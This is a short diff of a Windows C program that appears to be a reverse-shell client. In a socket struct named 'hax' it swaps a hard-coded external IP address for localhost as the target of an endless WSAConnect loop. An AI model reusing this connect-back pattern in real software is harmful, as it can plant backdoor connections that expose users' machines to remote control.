@@ -42,7 +42,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(80);
-	hax.sin_addr.s_addr = inet_addr("45.32.31.155");
+	hax.sin_addr.s_addr = inet_addr("127.0.0.1");
 
 	while (true) {
 		WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
